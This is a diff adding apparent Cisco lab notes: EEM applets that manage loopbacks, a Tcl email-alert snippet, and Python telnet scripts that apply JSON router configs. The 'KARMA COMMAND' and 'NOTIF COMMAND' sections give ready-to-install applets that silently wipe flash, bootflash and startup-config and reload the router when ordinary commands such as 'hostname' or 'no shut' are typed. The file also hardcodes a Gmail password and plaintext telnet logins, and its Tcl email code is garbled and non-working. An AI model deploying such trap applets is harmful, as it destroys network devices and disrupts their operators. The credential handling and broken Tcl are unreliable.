@@ -1,0 +1,305 @@
+
+==========WATCH LOOPBACKS ===================
+config t
+no event manager applet WatchLo1
+event manager applet WatchLo1
+ event syslog pattern "Interface Loopback1.* down" period 1
+ action 2.0 cli command "enable"
+ action 2.1 cli command "config t"
+ action 2.2 cli command "interface lo1"
+ action 2.3 cli command "no shutdown"
+ action 3.0 syslog msg "BETTER LUCK Gago Ka!!, Matik Interface Loopback1 was brought up via EEM"
+ end
+ config t
+no event manager applet WatchLo2
+event manager applet WatchLo2
+ event syslog pattern "Interface Loopback2.* down" period 1
+ action 2.0 cli command "enable"
+ action 2.1 cli command "config t"
+ action 2.2 cli command "interface lo2"
+ action 2.3 cli command "no shutdown"
+ action 3.0 syslog msg "BETTER LUCK Gago Ka!!, Matik Interface Loopback2 was brought up via EEM"
+ end
+  config t
+no event manager applet WatchLo3
+event manager applet WatchLo3
+ event syslog pattern "Interface Loopback3.* down" period 1
+ action 2.0 cli command "enable"
+ action 2.1 cli command "config t"
+ action 2.2 cli command "interface lo3"
+ action 2.3 cli command "no shutdown"
+ action 3.0 syslog msg "BETTER LUCK Gago Ka!!, Matik Interface Loopback3 was brought up via EEM"
+ end
+event manager run WatchLo1
+event manager run WatchLo2
+event manager run WatchLo3
+===============CREATE LOOPBACK ==================
+config t
+no event manager applet CreateLoopbacks
+event manager applet CreateLoopbacks
+ event none
+ action 1.0 puts "How many Loopback interfaces do you wish to create?"
+ action 1.1 puts nonewline "> "
+ action 1.2 gets num 
+ action 2.0 cli command "enable"
+ action 2.1 cli command "conf t"
+ action 3.0 set i "1"
+ action 3.1 while $i le $num
+ action 3.2  cli command "interface Loopback $i"
+ action 3.3  cli command "ip address $i.$i.$i.$i 255.255.255.255"
+ action 3.4  increment i 1
+ action 3.5 end
+ action 4.0 cli command "end"
+ end
+
+event manager run CreateLoopbacks
+
+=============REMOVE LOOPBACKS =================
+
+config t
+no event manager applet RemoveLoopbacks
+event manager applet RemoveLoopbacks
+ event none
+ action 1.0 puts "How many Loopback interfaces do you wish to create?"
+ action 1.1 puts nonewline "> "
+ action 1.2 gets num 
+ action 2.0 cli command "enable"
+ action 2.1 cli command "conf t"
+ action 3.0 set i "1"
+ action 3.1 while $i le $num
+ action 3.2  cli command "no interface Loopback $i"
+ action 3.4  increment i 1
+ action 3.5 end
+ action 4.0 cli command "end"
+ end
+
+event manager run RemoveLoopbacks
+
+==========KARMA COMMAND==========
+
+config t
+no event manager applet auto-delete-flash-and-reboot
+event manager applet auto-delete-flash-and-reboot
+ event cli pattern "hostname" sync no skip yes
+ action 1.0 cli command "delete /force /recursive flash:"
+ action 1.1 cli command "delete /force /recursive bootflash:"
+ action 1.2 cli command "erase startup-config"
+ action 2.0 syslog msg "Deleting flash and rebooting the device..."
+ action 3.0 reload
+
+
+To install the script, copy and paste the above configuration 
+into the device's configuration mode and then enter the following command:
+
+event manager run auto-delete-flash-and-reboot
+
+
+==========KARMA COMMAND 2==========
+
+config t
+no event manager applet auto-delete-flash-and-reboot
+event manager applet auto-delete-flash-and-reboot
+ event cli pattern "no shut" sync no skip yes
+ action 1.0 cli command "delete /force /recursive flash:"
+ action 1.1 cli command "delete /force /recursive bootflash:"
+ action 1.2 cli command "erase startup-config"
+ action 2.0 syslog msg "Deleting flash and rebooting the device..."
+ action 3.0 reload
+end
+
+! To install the script, copy and paste the above configuration into the device's configuration mode and then enter the following command:
+
+event manager run auto-delete-flash-and-reboot
+
+
+=================NOTIF COMMAND========
+
+config t
+no event manager applet erase_startup_config
+event manager applet erase_startup_config
+event cli pattern "hostname" sync no skip no
+action 1.0 cli command "enable"
+action 2.0 cli command "erase startup-config"
+action 3.0 cli command "show start"
+end
+event manager run erase_startup_config
+
+create a cisco router command that will
+ send an email alert using rivancorp@gmail.com
+ and password of C1sc0123 whenever an interface shutsdown:
+ 
+event manager applet interface_down
+event syslog pattern ".*interface.*down.*"
+action 1.0 cli command "enable"
+action 2.0 cli command "tclsh"
+action 2.1 tcl sh
+namespace eval ::cisco {
+  proc send_email {to from subject body} {
+    set smtp_server "smtp.gmail.com"
+    set smtp_port 587
+    set timeout 20
+    set user "rivancorp@gmail.com"
+    set password "C1sc0123"
+    set message [join [list \
+      "set smtp [socket $smtp_server $smtp_port]" \
+      "set timeout $timeout" \
+      "expect {\"220*\" {send \"ehlo $smtp_server\\r\"; exp_continue} }" \
+      "expect {\"250*\" {send \"starttls\\r\"; exp_continue} }" \
+      "expect {\"220*\" {send \"AUTH LOGIN\\r\"; exp_continue} }" \
+      "expect {\"334*\" {send [format {%s} [base64::encode $user]]\\r; exp_continue} }" \
+      "expect {\"334*\" {send [format {%s} [base64::encode $password]]\\r; exp_continue} }" \
+      "expect {\"235*\" {send [format {mail from:<%s>\\r} $from]\\r; exp_continue} }" \
+      "expect {\"250*\" {send [format {rcpt to:<%s>\\r} $to]\\r; exp_continue} }" \
+      "expect {\"250*\" {send \"data\\r\"; exp_continue} }" \
+      "expect {\"354*\" {send [format {subject:%s\\r\\n\\r\\n%s\\r\\n.} $subject $body]\\r; exp_continue} }" \
+      "expect {\"250*\" {send \"quit\\r\"}}" \
+      "close $smtp" \
+    ] \\n]
+    eval $message
+  }
+}
+set body [exec sh run interface | in shut]
+::cisco::send_email rivancorp@gmail.com rivancorp@gmail.com "Interface Down" $body
+
+================JSON=============
+to config int IP ADD
+{
+  "hostname": "admin",
+  "password": "password",
+  "ip_address": "192.168.108.139",
+  "subnet_mask": "255.255.255.0",
+  "interface": {
+    "GigabitEthernet1": {
+      "description": "GigaETH 1 VMNET 1",
+      "ip_address": "192.168.101.139",
+      "subnet_mask": "255.255.255.0"
+    },
+    "GigabitEthernet2": {
+      "description": "GigaETH 2 VMNET 2",
+      "ip_address": "192.168.102.139",
+      "subnet_mask": "255.255.255.0"
+    },
+    "Loopback0": {
+      "description": "Loopback 0",
+      "ip_address": "192.168.103.139",
+      "subnet_mask": "255.255.255.255"
+    },
+    "Loopback1": {
+      "description": "Loopback 1",
+      "ip_address": "1.1.1.1",
+      "subnet_mask": "255.255.255.255"
+    },
+    "Loopback2": {
+      "description": "Loopback 2",
+      "ip_address": "2.2.2.2",
+      "subnet_mask": "255.255.255.255"
+    }
+  }
+}
+
+===== TO RUN COMMANDS ABOVE======
+
+import json
+import telnetlib
+
+with open("router_config.json") as f:------------------------------------------ ("") yung name ng file dapat same sa json file and ilalagay nya yun sa F
+    config = json.load(f)
+
+hostname = config["hostname"]
+password = config["password"]
+ip_address = config["ip_address"]
+
+tn = telnetlib.Telnet(ip_address)
+
+tn.read_until(b"Username: ")
+tn.write(hostname.encode('ascii') + b"\n")
+
+tn.read_until(b"Password: ")
+tn.write(password.encode('ascii') + b"\n")
+
+tn.write(b"enable\n")
+tn.write(password.encode('ascii') + b"\n")
+
+tn.write(b"configure terminal\n")
+
+for iface, info in config["interface"].items():
+    tn.write(f"interface {iface}\n".encode('ascii'))
+    tn.write(f"description {info['description']}\n".encode('ascii'))
+    tn.write(f"ip address {info['ip_address']} {info['subnet_mask']}\n".encode('ascii'))
+    tn.write(b"no shutdown\n")
+
+tn.write(b"end\n")
+tn.write(b"exit\n")
+
+print(tn.read_all().decode('ascii'))
+
+=======CREATE LOOPBACK FOR 3 ROUTERS===========
+
+{
+ "router": [
+  {
+     "host_ip": "192.168.108.139",
+     "hostname": "PYTHONxJSON1",
+	 "username": "admin",
+	 "password": "password",
+     "lo_interfaces": ["1.1.1.11","2.2.2.22","3.3.3.33"]
+  },
+   {
+     "host_ip": "192.168.108.140",
+     "hostname": "PYTHONxJSON2",
+	 "username": "admin",
+	 "password": "password",
+     "lo_interfaces": ["4.4.4.44","5.5.5.55","6.6.6.66"]
+   },
+   {
+     "host_ip": "192.168.108.141",
+     "hostname": "PYTHONxJSON3",
+	 "username": "admin",
+	 "password": "password",
+     "lo_interfaces": ["7.7.7.77","8.8.8.88","9.9.9.99"]
+  }
+ ]
+}
+
+===== TO RUN COMMANDS ABOVE======
+
+import telnetlib
+import json
+
+with open('cisco1.json') as f:
+    data = json.load(f)
+
+for entry in data['router']:
+    host_ip = entry['host_ip']
+    username = entry['username']
+    password = entry['password']
+    hostname = entry['hostname']
+
+    tn = telnetlib.Telnet(host_ip)
+
+    tn.read_until(b"Username: ")
+    tn.write(username.encode('ascii') + b"\n")
+    if password:
+        tn.read_until(b"Password: ")
+        tn.write(password.encode('ascii') + b"\n")
+
+    tn.write(b"enable\n")
+    tn.write(b"pass\n")
+    tn.write(b"conf t\n")
+    tn.write(b"hostname " + hostname.encode('ascii') + b"\n")
+
+    lo_number = 1
+    for interface in entry['lo_interfaces']:
+        tn.write(b"no int lo " + str(lo_number).encode('ascii') + b"\n")
+        tn.write(b"int lo" + str(lo_number).encode('ascii') + b"\n")
+        tn.write(b"ip add " + interface.encode('ascii') + b" 255.255.255.0\n")
+        tn.write(b"no shut\n")
+        lo_number = lo_number + 1
+
+    tn.write(b"end\n")
+    tn.write(b"exit\n")
+    print(tn.read_all().decode('ascii'))
+    tn.close()
+
+f.close()
+
